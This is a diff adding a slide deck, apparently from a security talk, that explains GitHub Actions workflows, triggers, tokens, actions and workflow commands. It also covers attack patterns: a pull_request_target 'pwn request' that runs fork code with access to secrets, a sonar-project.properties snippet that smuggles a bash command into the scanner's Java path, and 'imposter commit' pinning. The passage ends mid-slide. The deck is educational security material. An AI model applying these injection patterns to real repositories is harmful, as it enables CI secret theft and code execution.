@@ -1,0 +1,497 @@
+<!doctype html><html lang=en><head><meta name=generator content="Hugo 0.119.0"><meta charset=utf-8><title>GHA</title><meta name=apple-mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-status-bar-style content="black-translucent"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><link rel=stylesheet href=/reveal-js/dist/reset.css><link rel=stylesheet href=/reveal-js/dist/reveal.css><link rel=stylesheet href=/reveal-hugo/themes/robot-lung.css id=theme><link rel=stylesheet href=/highlight-js/default.min.css></head><body><div class=reveal><div class=slides><section><h1 id=github-actions>Github actions</h1><p>In action</p></section><section><h1 id=who-we-are>Who we are</h1><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=nohighlight data-noescape><span style=display:flex><span><span style=color:#f92672>Tristan</span>: 
+</span></span><span style=display:flex><span>  <span style=color:#f92672>role</span>: <span style=color:#ae81ff>Cyber Engineer</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>Zmx</span>:
+</span></span><span style=display:flex><span><span style=color:#f92672>Tr4l</span>:
+</span></span><span style=display:flex><span><span style=color:#f92672>BGTian</span>:
+</span></span></code></pre></div></section><section><h2 id=roadmap>Roadmap</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=nohighlight data-noescape><span style=display:flex><span><span style=color:#f92672>definition</span>:
+</span></span><span style=display:flex><span>  - <span style=color:#ae81ff>github workflow</span>
+</span></span><span style=display:flex><span>  - <span style=color:#ae81ff>github action</span>
+</span></span><span style=display:flex><span>  - <span style=color:#ae81ff>github command</span>
+</span></span><span style=display:flex><span>  - <span style=color:#ae81ff>github runner</span>
+</span></span><span style=display:flex><span>  - <span style=color:#ae81ff>env file</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>playground</span>:
+</span></span><span style=display:flex><span>   - <span style=color:#ae81ff>...</span>
+</span></span></code></pre></div></section><section><h2 id=disclaimer>Disclaimer</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=nohighlight data-noescape><span style=display:flex><span><span style=color:#f92672>opinions</span>: <span style=color:#ae81ff>mine, personal</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>complete sentence</span>: <span style=color:#ae81ff>either the doc, or chatGPT</span>
+</span></span></code></pre></div></section><section><h2 id=what-is-a-github-workflow>What is a github workflow</h2><p>A GitHub Workflow is an automated process that you can set up in your GitHub repository to help streamline and manage processes such as continuous integration, continuous deployment, testing, and more</p></section><section><h3 id=zoom-in-a-github-workflow>Zoom in a github workflow</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=nohighlight data-noescape><span style=display:flex><span><span style=color:#f92672>workflow</span>:
+</span></span><span style=display:flex><span>  <span style=color:#f92672>jobs</span>:
+</span></span><span style=display:flex><span>    <span style=color:#f92672>first job</span>:
+</span></span><span style=display:flex><span>      <span style=color:#f92672>steps</span>:
+</span></span><span style=display:flex><span>        <span style=color:#f92672>first step</span>:
+</span></span><span style=display:flex><span>        <span style=color:#f92672>second step</span>:
+</span></span><span style=display:flex><span>    <span style=color:#f92672>second job</span>:
+</span></span><span style=display:flex><span>      <span style=color:#f92672>steps</span>:
+</span></span><span style=display:flex><span>        <span style=color:#f92672>another step</span>:        
+</span></span></code></pre></div></section><section><h2 id=example-github-workflow>Example github workflow</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=nohighlight data-noescape><span style=display:flex><span><span style=color:#75715e># .github/workflows/example.yml</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>name</span>: <span style=color:#ae81ff>Jobs example</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>on</span>:
+</span></span><span style=display:flex><span>  <span style=color:#f92672>workflow_dispatch</span>:  
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>jobs</span>:
+</span></span><span style=display:flex><span>  <span style=color:#f92672>Stuff</span>:
+</span></span><span style=display:flex><span>    <span style=color:#f92672>name</span>: <span style=color:#ae81ff>Job name</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>runs-on</span>: <span style=color:#ae81ff>self-hosted</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>steps</span>:    
+</span></span><span style=display:flex><span>      - <span style=color:#f92672>name</span>: <span style=color:#ae81ff>Output a variable</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>run</span>: |<span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>           echo &#34;${{ vars.VARIABLE }}&#34;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>           # echo &#34;${{ vars.VARIABLE2 }}&#34;</span>           
+</span></span></code></pre></div></section><section><h3 id=zoom-in-a-github-jobs>Zoom in a github jobs</h3><p>A workflow can consist of one or more jobs, which are executed in parallel or sequentially. <em><strong>Each job runs in its own virtual environment</strong></em> and can be specified to run on different operating systems or configurations.</p></section><section><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=nohighlight data-noescape><span style=display:flex><span><span style=color:#e6db74>&#34;steps&#34;</span><span style=color:#960050;background-color:#1e0010>:</span> [
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;type&#34;</span>: <span style=color:#e6db74>&#34;action&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;reference&#34;</span>: {
+</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;type&#34;</span>: <span style=color:#e6db74>&#34;script&#34;</span>
+</span></span><span style=display:flex><span>        },
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;displayNameToken&#34;</span>: {
+</span></span><span style=display:flex><span>            <span style=color:#960050;background-color:#1e0010>[...],</span>
+</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;lit&#34;</span>: <span style=color:#e6db74>&#34;Output a variable&#34;</span>
+</span></span><span style=display:flex><span>        },
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;contextName&#34;</span>: <span style=color:#e6db74>&#34;__run&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;inputs&#34;</span>: {
+</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;type&#34;</span>: <span style=color:#ae81ff>2</span>,
+</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;map&#34;</span>: [
+</span></span><span style=display:flex><span>                {
+</span></span><span style=display:flex><span>                    <span style=color:#f92672>&#34;key&#34;</span>: <span style=color:#e6db74>&#34;script&#34;</span>,
+</span></span><span style=display:flex><span>                    <span style=color:#f92672>&#34;value&#34;</span>: {
+</span></span><span style=display:flex><span>                        <span style=color:#960050;background-color:#1e0010>[...],</span>
+</span></span><span style=display:flex><span>                        <span style=color:#f92672>&#34;expr&#34;</span>: <span style=color:#e6db74>&#34;format(&#39;echo \&#34;{0}\&#34;\n# echo \&#34;{1}\&#34;\n&#39;, vars.VARIABLE, vars.VARIABLE2)&#34;</span>
+</span></span><span style=display:flex><span>                    }
+</span></span><span style=display:flex><span>                }
+</span></span><span style=display:flex><span>            ]
+</span></span><span style=display:flex><span>        },
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;condition&#34;</span>: <span style=color:#e6db74>&#34;success()&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;id&#34;</span>: <span style=color:#e6db74>&#34;efaa3446-2c3c-57b8-85a7-177909aad4f8&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;name&#34;</span>: <span style=color:#e6db74>&#34;__run&#34;</span>
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>]<span style=color:#960050;background-color:#1e0010>,</span>
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>...</span>
+</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;contextData&#34;</span><span style=color:#960050;background-color:#1e0010>:</span> {
+</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;github&#34;</span>: {<span style=color:#960050;background-color:#1e0010>...</span>},
+</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;vars&#34;</span>: {
+</span></span><span style=display:flex><span>      <span style=color:#f92672>&#34;t&#34;</span>: <span style=color:#ae81ff>2</span>,
+</span></span><span style=display:flex><span>      <span style=color:#f92672>&#34;d&#34;</span>: [
+</span></span><span style=display:flex><span>          {
+</span></span><span style=display:flex><span>              <span style=color:#f92672>&#34;k&#34;</span>: <span style=color:#e6db74>&#34;VARIABLE&#34;</span>,
+</span></span><span style=display:flex><span>              <span style=color:#f92672>&#34;v&#34;</span>: <span style=color:#e6db74>&#34;This is a variable&#34;</span>
+</span></span><span style=display:flex><span>          },
+</span></span><span style=display:flex><span>          {
+</span></span><span style=display:flex><span>              <span style=color:#f92672>&#34;k&#34;</span>: <span style=color:#e6db74>&#34;VARIABLE2&#34;</span>,
+</span></span><span style=display:flex><span>              <span style=color:#f92672>&#34;v&#34;</span>: <span style=color:#e6db74>&#34;VARIABLE2&#34;</span>
+</span></span><span style=display:flex><span>          }
+</span></span><span style=display:flex><span>      ]
+</span></span><span style=display:flex><span>},
+</span></span></code></pre></div></section><section><h2 id=context>Context</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=nohighlight data-noescape><span style=display:flex><span><span style=color:#f92672>vars</span>:
+</span></span><span style=display:flex><span><span style=color:#f92672>secrets</span>: 
+</span></span><span style=display:flex><span><span style=color:#f92672>github</span>:
+</span></span><span style=display:flex><span>  <span style=color:#f92672>repository</span>:
+</span></span><span style=display:flex><span>  <span style=color:#f92672>event_name</span>:
+</span></span><span style=display:flex><span>  <span style=color:#f92672>event</span>:
+</span></span><span style=display:flex><span>    <span style=color:#f92672>inputs</span>:
+</span></span><span style=display:flex><span>    [<span style=color:#ae81ff>...]</span>
+</span></span></code></pre></div></section><section><h2 id=permission>Permission</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=nohighlight data-noescape><span style=display:flex><span><span style=color:#f92672>Workflow</span>:
+</span></span><span style=display:flex><span><span style=color:#f92672>Jobs</span>:
+</span></span><span style=display:flex><span><span style=color:#75715e># Granted to the GH_TOKEN</span>
+</span></span></code></pre></div><p>(Most) GH_TOKEN permissions expire when the workflow/jobs ends.</p></section><section><h2 id=how-to-triggers-a-workflow>How to triggers a workflow</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=nohighlight data-noescape><span style=display:flex><span><span style=color:#f92672>on</span>:
+</span></span><span style=display:flex><span>  <span style=color:#f92672>pull_request</span>:
+</span></span><span style=display:flex><span>    <span style=color:#f92672>types</span>:
+</span></span><span style=display:flex><span>      - <span style=color:#ae81ff>assigned</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>branches</span>:    
+</span></span><span style=display:flex><span>      - <span style=color:#e6db74>&#39;demo-branch/**&#39;</span>
+</span></span></code></pre></div></section><section><h2 id=how-to-triggers-a-workflow-1>How to triggers a workflow</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=nohighlight data-noescape><span style=display:flex><span><span style=color:#f92672>on</span>:
+</span></span><span style=display:flex><span>    <span style=color:#f92672>branch_protection_rule</span>: <span style=color:#ae81ff>Runs your workflow when branch protection rules in the workflow repository are changed</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>check_run</span>: <span style=color:#ae81ff>Runs your workflow when activity related to a check run occurs.</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>check_suite</span>: <span style=color:#ae81ff>Runs your workflow when check suite activity occurs.</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>create</span>: <span style=color:#ae81ff>Runs your workflow when someone creates a Git reference (Git branch or tag) </span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>delete</span>: <span style=color:#ae81ff>Runs your workflow when someone deletes a Git reference (Git branch or tag)</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>deployment</span>: <span style=color:#ae81ff>Runs your workflow when someone creates a deployment in the workflow&#39;s repository.</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>deployment_status</span>: <span style=color:#ae81ff>Runs your workflow when a third party provides a deployment status</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>discussion</span>: <span style=color:#ae81ff>Runs your workflow when a discussion in the workflow&#39;s repository is created or modified. </span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>discussion_comment</span>: <span style=color:#ae81ff>Runs your workflow when a comment on a discussion in the workflow&#39;s repository is created or modified</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>fork</span>: <span style=color:#ae81ff>Runs your workflow when someone forks a repository.</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>gollum</span>: <span style=color:#ae81ff>Runs your workflow when someone creates or updates a Wiki page</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>issue_comment</span>: <span style=color:#ae81ff>Runs your workflow when an issue or pull request comment is created, edited, or deleted</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>issues</span>: <span style=color:#ae81ff>Runs your workflow when an issue in the workflow&#39;s repository is created or modified.</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>label</span>: <span style=color:#ae81ff>Runs your workflow when a label in your workflow&#39;s repository is created or modified.</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>merge_group</span>: <span style=color:#ae81ff>Runs your workflow when a pull request is added to a merge queue, which adds the pull request to a merge group.</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>milestone</span>: <span style=color:#ae81ff>Runs your workflow when a milestone in the workflow&#39;s repository is created or modified.</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>page_build</span>: <span style=color:#ae81ff>Runs your workflow when someone pushes to a branch that is the publishing source for GitHub Pages</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>public</span>: <span style=color:#ae81ff>Runs your workflow when your workflow&#39;s repository changes from private to public</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>pull_request</span>: <span style=color:#ae81ff>Runs your workflow when activity on a pull request in the workflow&#39;s repository occurs.</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>pull_request_review</span>: <span style=color:#ae81ff>Runs your workflow when a pull request review is submitted, edited, or dismissed</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>pull_request_review_comment</span>: <span style=color:#ae81ff>Runs your workflow when a pull request review comment is modified.</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>pull_request_target</span>: <span style=color:#ae81ff>Runs your workflow when activity on a pull request in the workflow&#39;s repository occurs.</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>push</span>: <span style=color:#ae81ff>Runs your workflow when you push a commit or tag, or when you create a repository from a template.</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>registry_package</span>: <span style=color:#ae81ff>Runs your workflow when activity related to GitHub Packages occurs in your repository.</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>release</span>: <span style=color:#ae81ff>Runs your workflow when release activity in your repository occurs.</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>repository_dispatch</span>: <span style=color:#ae81ff>You can use the GitHub API to trigger a webhook event called repository_dispatch</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>schedule</span>: <span style=color:#ae81ff>The schedule event allows you to trigger a workflow at a scheduled time.</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>status</span>: <span style=color:#ae81ff>Runs your workflow when the status of a Git commit changes</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>watch</span>: <span style=color:#ae81ff>Runs your workflow when the workflow&#39;s repository is starred. </span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>workflow_call</span>: <span style=color:#ae81ff>used to indicate that a workflow can be called by another workflow</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>workflow_dispatch</span>: <span style=color:#ae81ff>To enable a workflow to be triggered manually, you need to configure the workflow_dispatch event.</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>workflow_run</span>: <span style=color:#ae81ff>This event occurs when a workflow run is requested or completed.</span>
+</span></span></code></pre></div></section><section><h3 id=zoom-in-pull_request>Zoom in pull_request</h3><ul><li>pull_request, pull_request_review, pull_request_review_comment <em><strong>did not pass secrets</strong></em> to PR from fork repositories.</li><li>The <code>GITHUB_TOKEN</code> has read-only permissions by default. (*)</li><li>First-time contributor protection is activated (*)</li></ul><p>(* Jetlag may apply)</p></section><section><h3 id=zoom-in-pull_request_target>Zoom in pull_request_target</h3><p>pull_request_target are used in the context (github source code) of the &ldquo;target&rdquo; (often main for a PR)</p><ul><li><code>GITHUB_TOKEN</code> is granted read/write repository permission by default</li><li>workflow can access secrets</li><li>any caches share the same scope as the base branch</li></ul></section><section><h3 id=pwn-request-2020>Pwn Request (2020)</h3><p>The initial definition of a pwn request, was to fork a repo, change the source code to include some payload, and make the PR that will be executed.
+Most of the protection we&rsquo;ve seen before was put in place to reduce this risk.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=nohighlight data-noescape><span style=display:flex><span><span style=color:#f92672>on</span>:
+</span></span><span style=display:flex><span>  <span style=color:#f92672>pull_request</span>:
+</span></span><span style=display:flex><span><span style=color:#f92672>jobs</span>:
+</span></span><span style=display:flex><span>  <span style=color:#f92672>build</span>:
+</span></span><span style=display:flex><span>    <span style=color:#f92672>runs-on</span>: <span style=color:#ae81ff>ubuntu-latest</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>steps</span>:    
+</span></span><span style=display:flex><span>      - <span style=color:#f92672>uses</span>: <span style=color:#ae81ff>actions/checkout@v1</span>
+</span></span><span style=display:flex><span>      - <span style=color:#f92672>run</span>: <span style=color:#ae81ff>make</span>
+</span></span></code></pre></div></section><section><h3 id=pwn-request-2024>Pwn Request (2024)</h3><p>Now, pwn request have evolve and may include different trigger and injection</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=nohighlight data-noescape><span style=display:flex><span><span style=color:#f92672>on</span>:
+</span></span><span style=display:flex><span>  <span style=color:#f92672>pull_request_target</span>: <span style=color:#75715e># Mandatory to have access to secrets (from a fork)</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>jobs</span>:
+</span></span><span style=display:flex><span>  <span style=color:#f92672>build</span>:
+</span></span><span style=display:flex><span>    <span style=color:#f92672>runs-on</span>: <span style=color:#ae81ff>ubuntu-latest</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>steps</span>:    
+</span></span><span style=display:flex><span>      - <span style=color:#f92672>uses</span>: <span style=color:#ae81ff>actions/checkout@v4</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>with</span>:
+</span></span><span style=display:flex><span>          <span style=color:#f92672>ref</span>: <span style=color:#ae81ff>${{ github.event.pull_request.head.sha }}</span>
+</span></span><span style=display:flex><span>      - <span style=color:#f92672>name</span>: <span style=color:#ae81ff>SonarQube Scan</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>uses</span>: <span style=color:#ae81ff>SonarSource/sonarqube-scan-action@v4.1.0</span> <span style=color:#75715e># It&#39;s just a scan, right ?</span>
+</span></span><span style=display:flex><span>          <span style=color:#f92672>env</span>:
+</span></span><span style=display:flex><span>            <span style=color:#f92672>SONAR_TOKEN</span>: <span style=color:#ae81ff>${{ secrets.SONAR_TOKEN }}</span>
+</span></span><span style=display:flex><span>            <span style=color:#f92672>SONAR_HOST_URL</span>: <span style=color:#ae81ff>${{ vars.SONAR_HOST_URL }}</span>
+</span></span></code></pre></div></section><section><p>sonar-project.properties</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=nohighlight data-noescape><span style=display:flex><span><span style=color:#a6e22e>sonar.scanner.javaExePath</span><span style=color:#f92672>=</span><span style=color:#e6db74>/usr/bin/bash</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>sonar.scanner.javaOpts</span><span style=color:#f92672>=</span><span style=color:#e6db74>-c ls</span>
+</span></span></code></pre></div></section><section><h1 id=uses-githubaction>uses: github/action</h1><p>In GitHub Actions, an action is a reusable piece of code that performs a specific task within a workflow. Actions can range from simple scripts executing commands to complex functions encapsulating rich functionality, and they help automate various parts of the software development lifecycle.</p></section><section><h2 id=github-action-type>Github action: type</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=nohighlight data-noescape><span style=display:flex><span><span style=color:#f92672>node</span>:
+</span></span><span style=display:flex><span><span style=color:#f92672>docker</span>:
+</span></span><span style=display:flex><span><span style=color:#f92672>composite</span>:
+</span></span></code></pre></div></section><section><h2 id=common-action-repo-node>Common action repo (node)</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=nohighlight data-noescape><span style=display:flex><span><span style=color:#f92672>.github</span>: <span style=color:#75715e># with some workflow to &#34;build&#34; the action</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>dist</span>:
+</span></span><span style=display:flex><span>  - <span style=color:#ae81ff>index.js</span> <span style=color:#75715e># This one will be executed (most often)</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>src</span>:
+</span></span><span style=display:flex><span>  - <span style=color:#ae81ff>main.ts</span> <span style=color:#75715e># The source code to generate the index.js</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>action.yml</span>: <span style=color:#75715e># The definition of the action</span>
+</span></span></code></pre></div></section><section><h2 id=how-github-action-work-before-2025>How github action work (before 2025)</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=nohighlight data-noescape><span style=display:flex><span><span style=color:#f92672>setup job</span>:
+</span></span><span style=display:flex><span>  <span style=color:#f92672>check_out</span>:
+</span></span><span style=display:flex><span>    <span style=color:#f92672>ref</span>: <span style=color:#ae81ff>version</span>
+</span></span><span style=display:flex><span>  <span style=color:#f92672>pre</span>: <span style=color:#75715e>#optional, part of the action that run before your steps</span>
+</span></span><span style=display:flex><span>  [<span style=color:#ae81ff>...]</span> <span style=color:#75715e># your job</span>
+</span></span><span style=display:flex><span>  <span style=color:#f92672>use</span>: <span style=color:#ae81ff>action</span> <span style=color:#75715e># run the code inside the action</span>
+</span></span><span style=display:flex><span>  [<span style=color:#ae81ff>...]</span> <span style=color:#75715e># your job</span>
+</span></span><span style=display:flex><span>  <span style=color:#f92672>post</span>: <span style=color:#75715e>#optional, part of the action that run after your steps</span>
+</span></span></code></pre></div></section><section><h2 id=how-github-action-work-before-2025-1>How github action work (before 2025)</h2><ul><li>Action are check-outed with tag at predefined location</li><li>Have access to filesystem (workspace, etc &mldr;)</li><li>Can use/set <code>GITHUB_ENV</code></li><li>As we use tags and checkout, content of an action can change.</li><li>Cyber often recommend to use sha instead of tag because of that</li><li>&ldquo;dist&rdquo; is not &ldquo;src&rdquo; !</li></ul></section><section><h2 id=imposter-commit->Imposter commit !</h2><p>Main repository and fork share commits. You can checkout any commit from main on fork, and viceversa.</p><p>This can be used on github action, as they checkout the action.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=nohighlight data-noescape><span style=display:flex><span><span style=color:#f92672>runs-on</span>: <span style=color:#ae81ff>ubuntu-latest</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>steps</span>:    
+</span></span><span style=display:flex><span>    - <span style=color:#f92672>uses</span>: <span style=color:#ae81ff>actions/checkout@dd5cf19253c6870af0024d884c335b9a9757c58f</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># This commit came from a fork</span>
+</span></span></code></pre></div></section><section><h2 id=supply-chain-surface>Supply chain surface</h2><ul><li>actions depend on action, that depends on action.</li><li>action are mostly written in node</li><li>node use package that depend on package&mldr;</li><li>no attestation between the code you see and the one built</li></ul></section><section><h2 id=immutable-action>Immutable action</h2><p>TODO</p></section><section><h1 id=what-is-a-github-command>What is a github command</h1><p>Actions can communicate with the runner machine to set environment variables, output values used by other actions, add debug messages to the output logs, and other tasks.</p><p>Most workflow commands use the echo command in a specific format, while others are invoked by writing to a file.</p></section><section><h1 id=documented>Documented</h1><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=nohighlight data-noescape><span style=display:flex><span><span style=color:#ae81ff>error / warning / notice / debug</span>
+</span></span><span style=display:flex><span><span style=color:#ae81ff>group / endgroup</span>
+</span></span><span style=display:flex><span><span style=color:#ae81ff>echo</span>
+</span></span><span style=display:flex><span><span style=color:#ae81ff>add-mask</span>
+</span></span><span style=display:flex><span><span style=color:#ae81ff>stop-commands</span>
+</span></span></code></pre></div><p>Example:</p><pre tabindex=0><code>echo &#34;::error file=app.js,line=1,col=5,endColumn=7,title=YOUR-TITLE::Missing semicolon&#34;
+</code></pre></section><section><h1 id=not-so-documented>Not so documented</h1><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=nohighlight data-noescape><span style=display:flex><span><span style=color:#f92672>internal-set-repo-path</span>: <span style=color:#ae81ff>probably internal</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>set-output</span>: <span style=color:#ae81ff>deprecated since october 2022, but still usable</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>save-state</span>: <span style=color:#ae81ff>deprecated since october 2022, but still usable</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>add-path</span>: <span style=color:#ae81ff>deprecated, not usable without ACTIONS_ALLOW_UNSECURE_COMMANDS</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>set-env</span>: <span style=color:#ae81ff>deprecated, not usable without ACTIONS_ALLOW_UNSECURE_COMMANDS</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>add-matcher</span>: <span style=color:#ae81ff>load a file to be used as problem matcher</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>remove-matcher</span>: <span style=color:#ae81ff>remove it</span>
+</span></span></code></pre></div><p><a href=https://github.com/actions/runner/blob/main/src/Runner.Worker/ActionCommandManager.cs>https://github.com/actions/runner/blob/main/src/Runner.Worker/ActionCommandManager.cs</a></p></section><section><h1 id=not-so-documented-syntax>Not so documented syntax</h1><p>Actual syntax</p><pre tabindex=0><code>echo &#34;::workflow-command parameter1={data},parameter2={data}::{command value}&#34;
+</code></pre><p>Previous syntax</p><pre tabindex=0><code>echo &#34;##[workflow-command parameter1={data},parameter2={data}]{command value}&#34;
+</code></pre></section><section><h1 id=what-is-a-github-runner>What is a github runner</h1><p>A GitHub Runner is a lightweight, standalone application that runs your GitHub Actions workflows. Runners execute the scripts and commands defined in your workflow files</p></section><section><h2 id=public-github-runner>Public github runner</h2><p>ubuntu</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=nohighlight data-noescape><span style=display:flex><span>- <span style=color:#f92672>ephemeral</span>: <span style=color:#66d9ef>true</span>
+</span></span><span style=display:flex><span>- <span style=color:#f92672>docker</span>: <span style=color:#66d9ef>true</span>
+</span></span><span style=display:flex><span>- <span style=color:#f92672>sudo</span>: <span style=color:#ae81ff>allowed</span>
+</span></span><span style=display:flex><span>- <span style=color:#f92672>software pack</span>: <span style=color:#ae81ff>full</span>
+</span></span></code></pre></div></section><section><h1 id=what-are-env-file>What are ENV file</h1><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=nohighlight data-noescape><span style=display:flex><span><span style=color:#f92672>GITHUB_ENV</span>: <span style=color:#ae81ff>The path to the file that sets env variables from workflow commands.</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>GITHUB_OUTPUT</span>: <span style=color:#ae81ff>...  sets the current step&#39;s outputs from workflow commands</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>GITHUB_PATH</span>: <span style=color:#ae81ff>... sets system PATH variables from workflow commands.</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>GITHUB_STEP_SUMMARY</span>: <span style=color:#ae81ff>... contains job summaries from workflow commands.</span>
+</span></span></code></pre></div></section><section><h2 id=why-are-env-file>Why are ENV file</h2><p>Previous syntax</p><pre tabindex=0><code>echo &#34;::set-output name=skip::true&#34;
+</code></pre><p>New syntax</p><pre tabindex=0><code>echo &#34;skip=true&#34; &gt; $GITHUB_OUTPUT
+</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=nohighlight data-noescape><span style=display:flex><span><span style=color:#f92672>parse output</span>: <span style=color:#66d9ef>false</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>trigger</span>:
+</span></span><span style=display:flex><span>  <span style=color:#f92672>on</span>:
